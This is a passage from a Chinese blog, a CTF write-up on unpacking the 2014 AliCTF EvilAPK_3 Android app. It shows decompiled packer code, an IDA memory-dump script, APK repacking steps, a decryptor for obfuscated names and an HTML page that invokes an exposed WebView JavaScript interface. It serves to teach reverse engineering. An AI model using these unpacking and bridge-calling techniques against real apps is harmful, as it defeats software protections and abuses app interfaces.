std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v87, &amp;v84, &quot;:&quot;);    std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v88, &amp;v87, &amp;v64);    std::string::_M_assign((std::string *)&amp;v64, v90, v89);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v88);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v87);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84);  }  _android_log_print(3, &quot;debug&quot;, &quot;the new LD_PRELOAD is %s&quot;, v65);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v66, &amp;ali::g_filePath, &quot;/juice.data&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v67, &amp;ali::g_filePath, &quot;/fak.jar&quot;);  fd = open(v68, 0);  memset(&amp;s, 0, 0x14u);  sprintf(&amp;s, &quot;%d&quot;, fd);  std::string::string(&amp;v69, &amp;s, v52);  v73 = &amp;v72;  v74 = &amp;v72;  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_allocate_block(&amp;v72, v55 - v56 + 10);  *v73 = 0;  std::string::_M_appendT&lt;char const*&gt;(&amp;v72, &quot;DEX_FILE=&quot;, &quot;&quot;, v52);  std::string::append((std::string *)&amp;v72, (const std::string *)&amp;v54);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v75, &amp;v72, &quot;                     JUICE_FILE=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v76, &amp;v75, &amp;v66);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v77, &amp;v76, &quot;                     LD_PRELOAD=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v78, &amp;v77, &amp;v64);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(    &amp;v79,    &amp;v78,    &quot;                     /system/bin/dex2oat \t\t\t\t  \t --runtime-arg -Xms64m \t\t\t\t\t --runtime-arg -Xmx64m \t\t\t\t&quot;    &quot;\t --boot-image=/system/framework/boot.art                      --zip-fd=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v80, &amp;v79, &amp;v69);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v81, &amp;v80, &quot;\t\t\t\t\t --zip-location=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v82, &amp;v81, &amp;v67);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v83, &amp;v82, &quot;\t\t\t\t\t --oat-file=&quot;);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v84, &amp;v83, &amp;v57);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v70, &amp;v84, &quot;                     &quot;);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v84);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v83);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v82);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v81);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v80);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v79);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v78);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v77);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v76);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v75);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v72);  _android_log_print(3, &quot;debug&quot;, &quot;cmd is %s&quot;, v71);  system(v71);  close(fd);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v70);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v69);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v67);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v66);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v64);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v63);LABEL_24:  _android_log_print(3, &quot;debug&quot;, &quot;after oat gen&quot;);  v10 = ali::JDexFile;  v11 = dword_54140;  if ( ali::sdk_int &lt;= 19 )                     // sdk version &lt;= 19  {    v12 = _JNIEnv::NewStringUTF(v45, v60);    v13 = _JNIEnv::NewStringUTF(v45, v58);    v16 = _JNIEnv::CallStaticIntMethod(v45, v10, v11, v12, v13, 0);    v18 = 0;  }  else                                          // sdk version &gt; 19  {    v14 = _JNIEnv::NewStringUTF(v45, v60);    v15 = _JNIEnv::NewStringUTF(v45, v58);    v16 = _JNIEnv::CallStaticLongMethod(v45, v10, v11, v14, v15, 0);    v18 = v17;  }  _android_log_print(3, &quot;debug&quot;, &quot;cookie is %llx&quot;);  *(_DWORD *)v46 = v16;  *((_DWORD *)v46 + 1) = v18;  v19 = (int (__fastcall *)(int, signed int))dlsym((void *)0xFFFFFFFF, &quot;_ZNK3art7DexFile12FindClassDefEt&quot;);  _android_log_print(3, &quot;debug&quot;, &quot;DexFile::FindClassDefFn is %p&quot;, v19);  v20 = v19(v16, 1);  _android_log_print(3, &quot;debug&quot;, &quot;call FindClassDefFn(%p,%d) =&gt; %p&quot;, v16, 1, v20);  _android_log_print(3, &quot;debug&quot;, &quot;dex position is %p&quot;, v20 - 572);  _android_log_print(3, &quot;debug&quot;, &quot;dex head is %08x %08x&quot;, *(_DWORD *)(v20 - 572), *(_DWORD *)(v20 - 568));  v21 = *(unsigned __int8 **)(v20 - 540);  _android_log_print(3, &quot;debug&quot;, &quot;dex size is %d&quot;, v21);  MemEnableWrite((unsigned __int8 *)(v20 - 572), &amp;v21[v20 - 572]);  std::operator+&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(&amp;v61, &amp;ali::g_filePath, &quot;/juice.data&quot;);  if ( !ali::dex_juicer_patch((ali *)(v20 - 572), v21, v62, v22) )  {    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59);    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57);    v23 = &amp;v54;LABEL_44:    std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v23);    _android_log_print(3, &quot;debug&quot;, &quot;exit parse_dex&quot;);    return 0;  }  _android_log_print(6, &quot;debug&quot;, &quot;fail to patch dex&quot;);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v61);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v59);  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(&amp;v57);  v24 = &amp;v54;LABEL_46:  std::priv::_String_base&lt;char,std::allocator&lt;char&gt;&gt;::_M_deallocate_block(v24);  _android_log_print(3, &quot;debug&quot;, &quot;exit parse_dex error&quot;);  return -1;}</code></pre><p>在 openWithHeader 中，log 了三次 dex 的 magic number，中间分别进行了 RC4 解密和 LZMA 解压缩。最后得到的结果应该就是最终的 dex 文件：</p><pre><code class="cpp">int __fastcall ali::EncFile::openWithHeader(ali::EncFile *this, unsigned __int8 **a2, unsigned int *a3, unsigned int a4){  ali::EncFile *v4; // r5  unsigned __int8 **v5; // r11  unsigned int *v6; // r6  unsigned int v7; // r7  const char *v8; // r2  int fd; // r8  int v10; // r10  __blksize_t v12; // r3  unsigned __int8 *v13; // r4  ali *v14; // r0  __int64 v15; // r0  __int64 v16; // ST18_8  unsigned int *v17; // r3  ali *v18; // r0  __int64 v19; // r0  int v20; // r8  int v21; // r3  char v22; // r2  unsigned __int64 v23; // r0  ali *v24; // r0  unsigned __int8 *v25; // r9  ali *v26; // ST24_4  __int64 v27; // r0  __int64 v28; // ST18_8  ali *v29; // r0  __int64 v30; // r0  size_t v31; // [sp+2Ch] [bp-9Ch]  int v32; // [sp+30h] [bp-98h]  char v33; // [sp+34h] [bp-94h]  struct stat buf; // [sp+38h] [bp-90h]  v4 = this;  v5 = a2;  v6 = a3;  v7 = a4;  if ( !*((_DWORD *)this + 2) )  {    v8 = &quot;file path is null&quot;;LABEL_5:    _android_log_print(6, &quot;debug&quot;, v8);    return 0;  }  fd = open(*((const char **)this + 2), 0);  v10 = fstat(fd, &amp;buf);  if ( v10 )  {    v8 = &quot;fstat failed&quot;;    goto LABEL_5;  }  v12 = buf.st_blksize;  *v6 = buf.st_blksize;  *(_DWORD *)v4 = v12;  v13 = (unsigned __int8 *)mmap(0, *v6, 3, 2, fd, 0);  *((_DWORD *)v4 + 1) = v13;  close(fd);  v14 = (ali *)_android_log_print(                 3,                 &quot;debug&quot;,                 &quot;dex magic %c %c %c %c %c %c %c&quot;,// original dex magic                 *v13,                 v13[1],                 v13[2],                 v13[3],                 v13[4],                 v13[5],                 v13[6]);  LODWORD(v15) = ali::NanoTime(v14);  v16 = v15;  v18 = (ali *)ali::decryptRc4((ali *)v13, v13, (unsigned __int8 *)v6, v17);// RC4 decrypt  LODWORD(v19) = ali::NanoTime(v18);  ali::PrettyDuration((ali *)(v19 - v16), v19 - v16);  _android_log_print(3, &quot;debug&quot;, &quot;decrypted len:%u&quot;, *v6);  v20 = 0;  _android_log_print(    3,    &quot;debug&quot;,    &quot;after decrypt dex magic %c %c %c %c %c %c %c&quot;,// dex magic after RC4    *v13,    v13[1],    v13[2],    v13[3],    v13[4],    v13[5],    v13[6]);  v21 = (int)(v13 + 4);  do  {    v22 = 8 * v10++;    v23 = (unsigned __int64)*(unsigned __int8 *)(v21++ + 1) &lt;&lt; v22;    v20 += v23;  }  while ( v10 != 8 );  _android_log_print(3, &quot;debug&quot;, &quot;unpackSize: %u&quot;, v20);  *(_DWORD *)v4 = v7 + v20;  v24 = (ali *)mmap(0, v7 + v20, 3, 34, -1, 0);  *((_DWORD *)v4 + 1) = v24;  v25 = (unsigned __int8 *)v24 + v7;  v26 = v24;  LODWORD(v27) = ali::NanoTime(v24);  v31 = *v6;  v28 = v27;  v32 = v20;  v29 = (ali *)LzmaDecode(v25, &amp;v32, v13 + 13, &amp;v31, v13, 5, 1, &amp;v33, &amp;off_54028);// LZMA uncompress  LODWORD(v30) = ali::NanoTime(v29);  ali::PrettyDuration((ali *)(v30 - v28), v30 - v28);  munmap(v13, buf.st_blksize);  _android_log_print(    3,    &quot;debug&quot;,    &quot;after uncompressed dex magic %c %c %c %c %c %c %c&quot;,// dex magic after LZMA    *((unsigned __int8 *)v26 + v7),    v25[1],    v25[2],    v25[3],    v25[4],    v25[5],    v25[6]);  *v6 = v20;  if ( v5 )    *v5 = (unsigned __int8 *)*((_DWORD *)v4 + 1);  return *((_DWORD *)v4 + 1);}</code></pre><h1 id="Dump-Dex-File"><a href="#Dump-Dex-File" class="headerlink" title="Dump Dex File"></a>Dump Dex File</h1><p>知道了解析 dex 的流程，接下来就通过动态调试来吧 dex 文件 dump 下来。现在 BL 跳转到 openWithHeader 的语句处设下断点：</p><pre><code>.text:00026A7E loc_26A7E                               ; CODE XREF: parse_dex(_JNIEnv *,long long *)+622↑j.text:00026A7E                 MOV             R1, R9  ; unsigned __int8 **.text:00026A80                 MOV             R2, R4  ; unsigned int *.text:00026A82                 MOVS            R3, #0x10 ; unsigned int.text:00026A84                 BL              _ZN3ali7EncFile14openWithHeaderEPPhPjj ; ali::EncFile::openWithHeader(uchar **,uint *,uint).text:00026A88                 LDR.W           R3, [R9].text:00026A8C                 ADDS            R3, #0x10.text:00026A8E                 STR             R3, [R6]</code></pre><p>运行到断点处，单步步入 openWithHeader 函数，然后单步步过一直到 return，中间可以在 monitor 中用 tag:debug 过滤来查看 log。运行完后看到 log 输出的 magic number 已经是真实 dex 文件的样子了：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/1.png" srcset="/img/loading.gif" alt></p><p>根据函数的返回值存放在 R0 中，可以看到 R0 所指向的部分是一个 dex 文件的数据了：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/2.png" srcset="/img/loading.gif" alt></p><p>接下来我们可以把 dex 文件给 dump 下来。但文件的大小为多少？根据 dex 的数据结构，可以知道 dex 文件的大小位于偏移 0x20 处：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/3.png" srcset="/img/loading.gif" alt></p><p>接下来使用 IDC 脚本来 dump 数据：</p><pre><code class="cpp">static main(void) {    auto fp, begin, end, len, b;    fp = fopen(&quot;dump.dex&quot;, &quot;wb&quot;);    begin = 0x7584C010; // 解密后数据在内存中的位置    len = 0x0941FC; // 文件大小    end = begin + len;    for (b = begin; b &lt; end; b++) {        fputc(Byte(b), fp);    }}</code></pre><p>最后将 dump 下来的数据放进 JEB 中，反汇编可以得到真实的 MainActivity 代码：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/4.png" srcset="/img/loading.gif" alt></p><h1 id="Fix-Application"><a href="#Fix-Application" class="headerlink" title="Fix Application"></a>Fix Application</h1><p>使用 AndroidKiller 反编译加固后的 apk，找到 AndroidManifest.xml，删除 Application 的 android:name 属性：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.ali.tg.testapp&quot; platformBuildVersionCode=&quot;23&quot; platformBuildVersionName=&quot;6.0-2438415&quot;&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt;    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt;    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;    &lt;application android:allowBackup=&quot;true&quot; android:debuggable=&quot;true&quot; android:icon=&quot;@drawable/ic_launcher&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/AppTheme&quot;&gt;        &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;        &lt;activity android:name=&quot;.WebViewActivity&quot;/&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>回编译后，找到生成的 apk，压缩软件打开，替换我们 dump 出来的 classes.dex，同时删除 assets 文件夹，其他 so 文件不用管。修改完后重新签名打包并安装运行，可以正常使用。</p><h1 id="Find-Flag"><a href="#Find-Flag" class="headerlink" title="Find Flag"></a>Find Flag</h1><p>定位到真实的程序后，开始分析具体的内容。先来看 MainActivity，主要是一个点击事件，其中获取了 EditText 中的字符串并作为参数传入并启动 WebViewActivity：</p><pre><code class="java">package com.ali.tg.testapp;import android.app.Activity;import android.content.Intent;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.view.View$OnClickListener;import android.view.View;import android.widget.Button;import android.widget.EditText;public class MainActivity extends Activity {    class com.ali.tg.testapp.MainActivity$1 implements View$OnClickListener {        com.ali.tg.testapp.MainActivity$1(MainActivity arg1) {            MainActivity.this = arg1;            super();        }        public void onClick(View arg6) {            ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());            String v1 = MainActivity.this.edit.getText().toString(); // 获取EditText中的字符串            Intent v0 = new Intent();            v0.putExtra(ListViewAutoScrollHelpern.decrypt_native(&quot;dV.&quot;, 2), v1); // 将v1的值传给Intent，变量名为“dV.”解密后的值            v0.setClass(MainActivity.this, WebViewActivity.class); // 设置Intent要跳转的类为WebViewActivity            MainActivity.this.startActivity(v0); // 启动WebViewActivity        }    }    Button btn_enter;    View$OnClickListener btn_listener;    EditText edit;    public MainActivity() {        super();        this.btn_enter = null;        this.edit = null;        this.btn_listener = new com.ali.tg.testapp.MainActivity$1(this);    }    protected void onCreate(Bundle arg4) {        ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());        super.onCreate(arg4);        this.setContentView(0x7F030000);        this.edit = this.findViewById(0x7F060001);        this.btn_enter = this.findViewById(0x7F060002);        this.btn_enter.setOnClickListener(this.btn_listener);    }}</code></pre><p>然后来看看 WebViewActivity，主要就是新建了一个 JavaScriptInterface 对象，对象的名称同样被加密了。然后加载输入的 url，目标是最后能够成功调用对象 JavaScriptInterface 里的 showToast 方法。接下来需要根据密文解出对象名，并构造出相应的网页来弹出 Toast。不过这里好像 flag 就是“祥龙”，但还是继续往下尝试构造出能够弹 Toast 的方法：</p><pre><code class="java">package com.ali.tg.testapp;import android.app.Activity;import android.content.Context;import android.os.Bundle;import android.support.v4.app.ActionBarDrawerToggleJellybeanMR2n;import android.support.v4.widget.ListViewAutoScrollHelpern;import android.webkit.WebSettings;import android.webkit.WebView;import android.widget.Toast;public class WebViewActivity extends Activity {    public class JavaScriptInterface {        Context mContext;        JavaScriptInterface(WebViewActivity arg1, Context arg2) {            WebViewActivity.this = arg1;            super();            this.mContext = arg2;        }        public void showToast() { // 构造出一个页面能够调用这个函数就成功了            ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());            Toast.makeText(this.mContext, &quot;祥龙！&quot;, 0).show();        }    }    WebView wView;    public WebViewActivity() {        super();        this.wView = null;    }    protected void onCreate(Bundle arg7) {        ActionBarDrawerToggleJellybeanMR2n.b(ActionBarDrawerToggleJellybeanMR2n.a());        super.onCreate(arg7);        this.setContentView(0x7F030001);        this.wView = this.findViewById(0x7F060004);        WebSettings v2 = this.wView.getSettings();        v2.setJavaScriptEnabled(true);        v2.setJavaScriptCanOpenWindowsAutomatically(true);        this.wView.addJavascriptInterface(new JavaScriptInterface(this, ((Context)this)), ListViewAutoScrollHelpern.decrypt_native(&quot;BQ1$*[w6G_&quot;, 2)); // 添加一个JavascriptInterface对象，对象的变量名为“BQ1$*[w6G_”解密后的值        this.wView.loadUrl(this.getIntent().getStringExtra(ListViewAutoScrollHelpern.decrypt_native(&quot;dV.&quot;, 2))); // 把在MainActivity中获取的变量作为url来加载    }}</code></pre><h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><p>接下来再看看 ListViewAutoScrollHelpern 中的 decrypt_native 方法，发现是在 Native 层中的 translate 库实现的：</p><pre><code class="java">package android.support.v4.widget;import android.util.Log;public class ListViewAutoScrollHelpern {    static {        System.loadLibrary(&quot;translate&quot;);    }    public ListViewAutoScrollHelpern() {        super();    }    public static native String decrypt_native(String arg0, int arg1) {    }    public static void testLogv(String arg1) {        Log.v(&quot;cheatecore&quot;, arg1);    }    public static void testLogw(String arg1) {        Log.w(&quot;cheatecore&quot;, arg1);    }}</code></pre><p>然后将 libtranslat.so 载入 IDA。先看看 JNI_OnLoad，其中有两个函数 register_Algorithm 和 register_translate：</p><pre><code class="cpp">int __fastcall JNI_OnLoad(_JavaVM *a1){  int v1; // r1  jint v2; // r2  _JNIEnv *v3; // r4  jint v4; // r0  bool v5; // cf  int result; // r0  _JNIEnv *env; // [sp+4h] [bp-Ch]  env = 0;  if ( a1-&gt;functions-&gt;GetEnv(&amp;a1-&gt;functions, (void **)&amp;env, 65540) )    return -1;  v3 = env;  register_Algorithm(env, v1, v2);  v4 = register_translate(v3);  v5 = v4 &lt; 0;  result = v4 &amp; (v4 &gt;&gt; 32);  if ( !v5 )    result = 65540;  return result;}</code></pre><p>在 register_Algorithm 中发现了目标函数：</p><pre><code class="cpp">int __fastcall register_Algorithm(_JNIEnv *a1, int a2, jint a3){  _JNIEnv *v3; // r4  jclass v4; // r0  jclass v5; // r0  v3 = a1;  v4 = a1-&gt;functions-&gt;FindClass(&amp;a1-&gt;functions, &quot;android/support/v4/widget/ListViewAutoScrollHelpern&quot;);  v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v4, (const JNINativeMethod *)off_607C, 1);  v5 = v3-&gt;functions-&gt;FindClass(&amp;v3-&gt;functions, &quot;android/support/v4/view/PagerTitleStripIcsn&quot;);  v3-&gt;functions-&gt;RegisterNatives(&amp;v3-&gt;functions, v5, (const JNINativeMethod *)off_607C, 1);  return 0;}</code></pre><p>定位到目标函数，发现其中调用了一个 vigenere_decrypt：</p><pre><code class="cpp">jstring __fastcall decrypt_native(_JNIEnv *a1, jobject a2, jstring a3, jint a4){  jstring data; // r6  jint num; // r9  _JNIEnv *env; // r4  const char *v7; // r0  const char *v8; // r8  jstring v9; // r7  int v11; // [sp+4h] [bp+0h]  data = a3;  num = a4;  env = a1;  memset(&amp;v11, 0, 0x1000u);  v7 = env-&gt;functions-&gt;GetStringUTFChars(&amp;env-&gt;functions, data, 0);  v8 = v7;  if ( num == 2 )  {    vigenere_decrypt(v7, (char *)&amp;v11);    v9 = env-&gt;functions-&gt;NewStringUTF(&amp;env-&gt;functions, (const char *)&amp;v11);  }  else  {    v9 = data;  }  env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, data, v8);  return v9;}</code></pre><p>在 vigenere_decrypt 函数中，对输入的数据进行了解密：</p><pre><code class="cpp">signed int __fastcall vigenere_decrypt(const char *ciphertext, char *plaintext){  const char *ciphertext_1; // r8  char *plaintext_1; // r6  size_t len; // r0  char *v5; // r2  const char *table; // r3  signed int v7; // r7  int v8; // r0  int v9; // r1  int v10; // r5  int v11; // r0  int v12; // r10  char v13; // r3  signed int i; // r5  signed int result; // r0  signed int v16; // r9  int ch; // r3  char s; // [sp+4h] [bp-64h]  char v19; // [sp+48h] [bp-20h]  ciphertext_1 = ciphertext;  plaintext_1 = plaintext;  len = strlen(ciphertext);  v5 = &amp;s;  table = &quot;ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU&quot;;  v7 = len;  do  {    v8 = *(_DWORD *)table;    table += 8;    v9 = *((_DWORD *)table - 1);    *(_DWORD *)v5 = v8;    *((_DWORD *)v5 + 1) = v9;    v10 = (int)(v5 + 8);    v5 += 8;  }  while ( table != &quot;tCQU&quot; );  v11 = *(_DWORD *)table;  v12 = 0;  v13 = table[4];  *(_DWORD *)v10 = v11;  *(_BYTE *)(v10 + 4) = v13;  i = 0;  result = strlen(&amp;s);  v16 = result;  while ( i &lt; v7 )  {    ch = (unsigned __int8)ciphertext_1[i];    if ( ch - 32 &lt;= (unsigned int)&#39;^&#39; )         // chr(ch) &lt;= 127    {      plaintext_1[i] = (ch - (unsigned __int8)*(&amp;v19 + v12 - 68) + 95) % 95 + 32;// &amp;v19 - 68 = &amp;table      result = (v12 + 1) / v16;      v12 = (v12 + 1) % v16;    }    else                                        // chr(ch) &gt; 127    {      plaintext_1[i] = ch;    }    ++i;  }  return result;}</code></pre><p>我先是通过动态调试来获取到了两个字符串的解密结果：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/5.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2014-AliCTF-EvilAPK_3/6.png" srcset="/img/loading.gif" alt></p><p>然后尝试自己实现一个解密函数进行验证：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char *table = &quot;ncA8DaUPelq*S7Y9q#hLl0T##@XTuXHQpFA&amp;65eaUaY33WigYMXO9y7JtCQU&quot;;char *vigenere_decrypt(char *ciphertext) {    int j = 0;    int len = strlen(ciphertext);    printf(&quot;%d\n&quot;, len);    char plaintext[len];    for (int i = 0; i &lt; len; i++) {        char ch = ciphertext[i];        if ((ch - 32) &lt;= 0x5E) {            plaintext[i] = (ch - table[j] + 95) % 95 + 32;            j = (j + 1) % 16;        } else {            plaintext[i] = ch;        }    }    plaintext[len] = &#39;\x00&#39;;    return plaintext;}int main() {    char *ciphertext1 = &quot;dV.&quot;;    char *plaintext1 = vigenere_decrypt(ciphertext1);    printf(&quot;%s\n&quot;, plaintext1); // url    char *ciphertext2 = &quot;BQ1$*[w6G_&quot;;    char *plaintext2 = vigenere_decrypt(ciphertext2);    printf(&quot;%s\n&quot;, plaintext2); // SmokeyBear    return 0;}</code></pre><p>当然这里也可以 Hook 这个 so 文件，也可以直接编写代码调用 so 中的函数，条条大路通罗马。最后实现一个调用 Toast 的 html 页面：</p><pre><code class="html">&lt;html&gt;  &lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;    &lt;script type=&quot;text/javascript&quot;&gt;      function alicrack() {        SmokeyBear.showToast();      }    &lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    Crack EvilAPK_3    &lt;script type=&quot;text/javascript&quot;&gt;      alicrack();    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>在软件中输入对应的地址，成功弹窗：</p><p><img src="/pics/2014-AliCTF-EvilAPK_3/7.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://xz.aliyun.com/t/383" target="_blank" rel="noopener">https://xz.aliyun.com/t/383</a><br><a href="https://blog.csdn.net/AliMobileSecurity/article/details/53259788" target="_blank" rel="noopener">https://blog.csdn.net/AliMobileSecurity/article/details/53259788</a><br><a href="https://yq.aliyun.com/articles/64691" target="_blank" rel="noopener">https://yq.aliyun.com/articles/64691</a><br><a href="http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/" target="_blank" rel="noopener">http://pwn4.fun/2017/04/04/Android%E9%80%86%E5%90%91%E4%B9%8B%E8%84%B1%E5%A3%B3/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向入门（四）</title>
    <link href="/2020/02/14/%5BTODO%5DAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2020/02/14/%5BTODO%5DAndroid%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>Android 加壳和脱壳入门。</p><a id="more"></a><h1 id="dex-文件格式"><a href="#dex-文件格式" class="headerlink" title="dex 文件格式"></a>dex 文件格式</h1><p>Android 程序编译以后生成 apk 文件，里面的 classes.dex 文件存放着程序运行的字节码，dex 文件是可以直接在 Dalvik 虚拟机中加载运行的文件。由于 Dalvik 是一种针对嵌入式设备而特殊设计的 Java 虚拟机，所以 dex 文件与标准的 class 文件在结构设计上有着本质的区别。当 Java 程序编译成 class 后，还需要使用 dx 工具将所有的 class 文件整合到一个 dex 文件，目的是其中各个类能够共享数据，在一定程度上降低了冗余，同时也是文件结构更加经凑，dex 文件是传统 jar 文件大小的 50% 左右。要想手工脱壳，必须先了解 dex 的文件格式。</p><p><img src="/pics/Android逆向入门/四/1.png" srcset="/img/loading.gif" alt></p><p>ShakaApktool 使用 bs 命令即可对 class.dex 实现反编译回 smali 文件字节码，而使用 s 命令可以把 smali 字节码编译为 class.dex 文件：</p><pre><code class="bash">java -jar ShakaApktool bs classes.dex -o smali-dirjava -jar ShakaApktool s smali-dir -o example.dex</code></pre><p>dex 文件的数据结构大概如下：</p><table><thead><tr><th style="text-align:center">数据名称</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">header</td><td style="text-align:center">dex 文件头部，记录整个 dex 文件的相关属性</td></tr><tr><td style="text-align:center">string_ids</td><td style="text-align:center">字符串数据索引，记录了每个字符串在数据区的偏移量</td></tr><tr><td style="text-align:center">type_ids</td><td style="text-align:center">类似数据索引，记录了每个类型的字符串索引</td></tr><tr><td style="text-align:center">proto_ids</td><td style="text-align:center">原型数据索引，记录了方法声明的字符串，返回类型字符串，参数列表</td></tr><tr><td style="text-align:center">field_ids</td><td style="text-align:center">字段数据索引，记录了所属类，类型以及方法名</td></tr><tr><td style="text-align:center">method_ids</td><td style="text-align:center">类方法索引，记录方法所属类名，方法声明以及方法名等信息</td></tr><tr><td style="text-align:center">class_defs</td><td style="text-align:center">类定义数据索引，记录指定类各类信息，包括接口，超类，类数据偏移量</td></tr><tr><td style="text-align:center">data</td><td style="text-align:center">数据区，保存了各个类的真是数据</td></tr><tr><td style="text-align:center">link_data</td><td 